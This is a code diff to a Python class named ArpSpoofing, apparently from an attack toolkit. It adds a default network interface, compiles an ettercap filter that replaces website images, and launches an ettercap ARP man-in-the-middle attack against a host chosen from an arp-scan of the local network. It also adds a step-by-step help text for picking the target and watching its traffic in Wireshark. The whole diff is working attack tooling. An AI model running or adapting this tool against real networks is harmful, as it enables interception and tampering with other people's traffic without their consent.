@@ -14,6 +14,9 @@ class ArpSpoofing(attackBase.Attack):
 		print "\nAvailable Interfaces: "
 		subprocess.call(["ls", "/sys/class/net"])
                 interface = raw_input(self.shellCol.UNDERLINE + self.shellCol.BLUE + "\nSelect Interface: " + self.shellCol.ENDC)
+		if interface == "":
+			interface = "eth0"
+			print "Selected interface: " + interface
 		interfaceData = os.popen('ifconfig ' + interface + '| grep "inet\ Ad" | cut -d: -f2 | cut -d" " -f1') 
 		print self.shellCol.BLUE + "\nSelect one of the shown Addresses to attack: " + self.shellCol.ENDC
 		subprocess.call(["arp-scan", "--interface="+interface, "--localnet"])
@@ -44,9 +47,11 @@ class ArpSpoofing(attackBase.Attack):
 	# Replaces all images of websites on the attacked host
 	def ettercapFun(self):
 		self.ifaceData()
-		filter = "/usr/share/ettercap/catFilter.ef"		
+		#filter = "/usr/share/ettercap/catFilter.ef"		
 		#filter = "/usr/share/ettercap/test.ef"
-		#filter = "/home/Dokumente/test.ef"
+		path = os.path.dirname(os.path.abspath(__file__))
+		subprocess.call(["etterfilter", path + "/catFilter.filter", "-o", path + "/catFilter.ef"])
+		filter = path + "/catFilter.ef"
 		subprocess.call(["ettercap", "-T", "-q", "-F", filter, "-i", self.interface, "-M", "ARP", "/"+self.ipAddress+"//", "///", "&"])
 	
 	
@@ -57,4 +62,25 @@ class ArpSpoofing(attackBase.Attack):
 		elif(index == 2):
 			self.ettercapFun()
 
-	def help(self): pass
+	def help(self):
+		print "Tutorial how to use arp spoofing: \n", \
+			"\n1st step: \n", \
+			"Select available interface, (default is eth0). Then network of selected interface will be scanned for hosts.", \
+                        "\n\n2nd step: \n", \
+			"Enter the IPv4 address of the host which should be attacked", \
+			"\n\n3rd step: \n", \
+			"Start wireshark and listen on the selected interface to watch the network traffic of the attacked host." ,\
+			"\n\n4th step: \n", \
+			"Press ENTER to start the attack. Pressing q will stop a running attack."
+
+
+
+
+
+
+
+
+
+
+
+
